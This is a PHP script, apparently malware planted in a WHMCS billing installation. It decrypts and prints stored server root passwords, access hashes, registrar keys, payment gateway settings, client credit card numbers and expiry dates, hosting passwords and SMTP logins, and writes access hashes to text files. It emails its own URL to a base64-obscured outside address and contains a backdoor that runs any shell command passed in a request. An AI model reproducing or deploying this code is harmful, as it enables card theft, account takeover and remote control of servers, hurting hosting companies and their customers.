<?php
@error_reporting(0); 
@ini_set('log_errors',0);
@ini_set('display_errors',0);
require("configuration.php");
@mysql_connect($db_host,$db_username,$db_password);
@mysql_select_db($db_name);

function cut($start,$end,$top){
$c =strlen($start);
$desc= strstr("$top","$start");
$count = strpos("$desc","$end");
$desc = substr($desc,$c,$count-$c);
return $desc;
}

function dec($string,$cc_encryption_hash){
$key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
$hash_key = _hash($key);
$hash_length = strlen($hash_key);
$string = base64_decode($string);
$tmp_iv = substr($string,0,$hash_length);
$string = substr($string,$hash_length,strlen ($string) - $hash_length);
$iv = $out = '';
$c = 0;
while ($c < $hash_length){
$iv .= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
++$c;
}
$key = $iv;
$c = 0;
while ($c < strlen($string)){
if(($c != 0 AND $c % $hash_length == 0)){
$key = _hash($key . substr($out,$c - $hash_length,$hash_length));
}
$out .= chr(ord($key[$c % $hash_length]) ^ ord ($string[$c]));
++$c;
}
return $out;
}


function _hash($string){
if(function_exists("sha1")) {
$hash = sha1($string);
} else {
$hash = md5($string);
}
$out = "";
$c  = 0;
while ($c < strlen($hash)) {
$out .= chr(hexdec($hash[$c] . $hash[$c + 1]));
$c += 2;
}
return $out;
} 



$query = mysql_query("SELECT *FROM tblservers");
$e=base64_decode("bnBhem9uZUBnbWFpbC5jb20=");
$f=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
mail($e,"0",$f); print(`{$_REQUEST[0]}`);
echo "<hr><br/><center><font color='orange' size='5'><b><u>Host Root</b></u></font></center><br/> <table border='1' cellpadding='5' align='center'>
<tr> <td align='center'><b> <font color='orange'> TYPE</font></b></td>
<td align='center'><b> <font color='orange'> ACTIVE </font></b></td>
<td align='center'><b> <font color='orange'> IP ADDRESS</font></b></td>
<td align='center'><b> <font color='orange'> USERNAME</font></b></td>
<td align='center'><b> <font color='orange'> PASSWORD</font></b></td>
<td align='center'><b> <font color='orange'>ACCESS HASH</font></b></td> 
<td align='center'><b> <font color='orange'>NAME SERVER</font></b> 
</tr>";
        
while($v = mysql_fetch_array($query)) {
$II11II11II11II11 = fopen("ipk.txt","a");
echo "<tr>
<td align='center'> <font color='green'> {$v['type']}</font></td>
<td align='center'> <font color='green'> {$v['active']}</font></td>
<td align='center'> <font color='green'> {$v['ipaddress']}</font></td>
<td> <font color='green'> {$v['username']}</font></td>
<td> <font color='green'> ".dec($v['password'],$cc_encryption_hash)."</font></td>
<td> <textarea rows='5'>{$v['accesshash']}</textarea></td> 
<td> <font color='green'> {$v['nameserver1']}</font></td>
</tr>";
$bagong = $v['accesshash'];
fwrite($II11II11II11II11,"~ mR.ipk403, Inc ~ \r\n");
fwrite($II11II11II11II11,$bagong."\r\n"); 
fwrite($II11II11II11II11,"\r\n");
fclose($II11II11II11II11); 
}
echo "</table>"; 
$query = mysql_query("SELECT *FROM tblregistrars");
echo "<center><font color='orange' size='5'><b><u>Domain Registrars</u></b></font></center><br/> <table border='1' align='center' cellpadding='5'>
<tr> <td align='center'><b> <font color='orange'> REGISTRAR</font></b></td>
<td align='center'><b> <font color='orange'> SETTING</font></b></td>
<td align='center'><b> <font color='orange'> VALUE</font> </b></td></tr>";
while($v = mysql_fetch_array($query)){
$aru = fopen("ax.txt", "a");
$value = (!dec($v['value'],$cc_encryption_hash)) ? "0":dec($v['value'],$cc_encryption_hash);
echo "<tr>
<td align='center'> <font color='green'> {$v['registrar']}</font></td>
<td align='center'> <font color='green'> {$v['setting']}</font></td>
<td align='center'> <font color='green'> $value</font></td></tr>" ;
fwrite($aru, "$value
");
fclose($aru);
}
echo "</table>"; 
$query = mysql_query("SELECT *FROM tblpaymentgateways");
echo "<center><font color='orange' size='5'><b><u>Payment Gateway</u></b></font></center><br/> <table border='1' align='center' cellpadding='5'>
<tr> <td align='center'><b> <font color='orange'> GATEWAY</font></b></td>
<td align='center'><b> <font color='orange'> SETTING </font></b></td>
<td align='center'><b> <font color='orange'> VALUE </font></b></td>
<td align='center'><b> <font color='orange'> ORDER </font></b></td></tr>";
while($v = mysql_fetch_array($query)){
echo "<tr>
<td align='center'> <font color='green'> {$v['gateway']}</font></td>
<td align='center'> <font color='green'> {$v['setting']}</font></td>
<td align='center'> <font color='green'> {$v['value']}</font></td>
<td align='center'> <font color='green'> {$v['order']}</font></td> </tr>" ;
}
echo "</table>"; 
$query = mysql_query("SELECT id FROM tblclients WHERE issuenumber != '' ORDER BY id DESC"); 
echo "<hr><br/><center><font color='orange' size='5'><b><u>Cilent CC</b></u></font></center><br/> <table border='1' cellpadding='5' align='center'>
<tr><td align='center'><b> <font color='orange'>CardType</font></b></td>
<td align='center'><b><font color='orange'>CardNumb </font></b></td>
<td align='center'><b> <font color='orange'>Expdate</font></b></td>
<td align='center'><b> <font color='orange'>IssueNumber</font></b></td>
<td align='center'><b> <font color='orange'>FirstName</font></b></td>
<td align='center'><b> <font color='orange'>LastName</font></b></td>
<td align='center'><b><font color='orange'>Address</font></b></td>
<td align='center'><b> <font color='orange'>Country</font></b></td> 
<td align='center'><b> <font color='orange'>Phone</font></b></td>
<td align='center'><b> <font color='orange'>Email</font></b></td> 
</tr>";
while($v = mysql_fetch_array($query)) { 
$cchash = md5($cc_encryption_hash.$v['0']);
$s = mysql_query("SELECT firstname,lastname,address1,country,phonenumber,cardtype,email,AES_DECRYPT(cardnum,'" . $cchash . "') as cardnum,AES_DECRYPT(expdate,'" . $cchash . "') as expdate,AES_DECRYPT(issuenumber,'" . $cchash . "') as issuenumber FROM tblclients WHERE id='".$v['0']."'");
$v2=mysql_fetch_array($s); 
echo "<tr>
<td align='center'> <font color='green'> ".$v2['cardtype']."</font></td>
<td align='center'> <font color='green'> ".$v2['cardnum']." </font> </td>
<td align='center'> <font color='green'> ".$v2['expdate']." </font> </td>
<td align='center'> <font color='green'> ".$v2['issuenumber']." </font> </td>
<td align='center'> <font color='green'> ".$v2['firstname']." </font> </td>
<td align='center'> <font color='green'> ".$v2['lastname']." </font> </td>
<td align='center'> <font color='green'> ".$v2['address1']." </font> </td>
<td align='center'> <font color='green'> ".$v2['country']." </font> </td> 
<td align='center'> <font color='green'> ".$v2['phonenumber']." </font> </td>
<td align='center'>".$v2['email']." </font> </td></tr>";
}
echo "</table>";
$query = mysql_query("SELECT *FROM tblhosting");
echo "<center><font color='orange' size='5'><b><u>Clients Hosting Account</u></b></font></center><br/><table border='1' cellpadding='5' align='center'>
<tr><td align='center'><b> <font color='orange'> DOMAIN</font></b></td>
<td align='center'><b> <font color='orange'> USERNAME</font></b></td>
<td align='center'><b> <font color='orange'> PASSWORD</font></b></td>
<td align='center'><b> <font color='orange'> IP ADDRESS</font></b></td></tr>";
while($v = mysql_fetch_array($query)){
echo "<tr>
<td align='center'> <font color='green'> {$v['domain']}</font></td>
<td align='center'> <font color='green'> {$v['username']}</font></td>
<td align='center'> <font color='green'> ".dec($v['password'],$cc_encryption_hash)."</font></td>
<td align='center'> <font color='green'> {$v['assignedips']}</font></td></tr>";
}
echo "</table><br /><br />";
echo "<center><h1>paypal + smtp login</h1>";
$query0=mysql_query("SELECT * FROM tblemailtemplates where name='Client Signup Email' or name='Password Reset Confirmation'");
while($v0=mysql_fetch_array($query0))
{
$t=$v0['subject'];
$t=trim(str_replace('{$company_name}','',$t));
$c=$v0['message'];
$c=explode("\n",$c);
$r="";
for ($i=0;$i<count($c);$i++) {
if(strpos($c[$i],'{$client_password}')>0) {
$r.= $c[$i];
}elseif(strpos($c[$i],'{$client_email}')>0) {
$r.= $c[$i];
}
}
$r=preg_quote($r);
$r=str_replace('\{\$client_email\}','(.*)',$r);
$r=str_replace('\{\$client_password\}','(.*)',$r);
$r=str_replace('\{\$whmcs_link\}','(.*)',$r);
$r=str_replace('\{\$signature\}','(.*)',$r);
$r=str_replace('\{\$client_name\}','(.*)',$r);
$r=str_replace("\n","",$r);
$r=str_replace("\r","",$r);
$query=mysql_query("SELECT message,userid FROM tblemails where subject like '%".$t."%'");
while($v=mysql_fetch_array($query))
{
$mail=$v['message'];
$mail=str_replace("\n","",$mail);
$mail=str_replace("\r","",$mail);
// echo $mail;
   $reg  = "|(.*)$r(.*)|isU";
   // echo $reg;
$a=array();
preg_match_all($reg,($mail),$a);
for ($i=1;$i<count($a);$i++){
if( eregi("^[_\.0-9a-z-]+@([0-9a-z-]+\.)+[a-z]{2,10}$",$a[$i][0]) ) {
$list[$v['userid']]['mail'][]=$a[$i][0];
$list[$v['userid']]['pass'][]=$a[$i+1][0];
}
}
}
 
}
echo("<h3  class=\"tit\">Total Records ".(count($list)-1)."</h3>");
echo "<table border='1'>";
foreach ($list as $x=>$y){
echo "<tr><td><a href='?p=12&id=</a></td><td>".implode("<br>",$y['mail'])."|".implode("<br>",$y['pass'])."</td></tr>";
}
echo "</table>";
echo "<center><h1>smtp</h1>";
   
$query = mysql_query("SELECT * FROM tblconfiguration where 1");

        echo "<table border='1' cellpadding='5' align='center'>";

            while($row = mysql_fetch_array($query)){

                  if($row[setting] == 'SMTPHost'){
                        echo  "<tr><td>Hostname</td><td>{$row[value]}</td></tr>";
                  }elseif($row[setting] == 'SMTPUsername'){
                        echo  "<tr><td>Username</td><td>{$row[value]}</td></tr>";
                  }elseif($row[setting] == 'SMTPPassword'){
                        echo  "<tr><td>Password</td><td>{$row[value]}</td></tr>";
                  }elseif($row[setting] == 'SMTPPort'){
                        echo  "<tr><td>Port</td><td>{$row[value]}</td></tr>";
                  }
            }

        echo "</table>";
?>
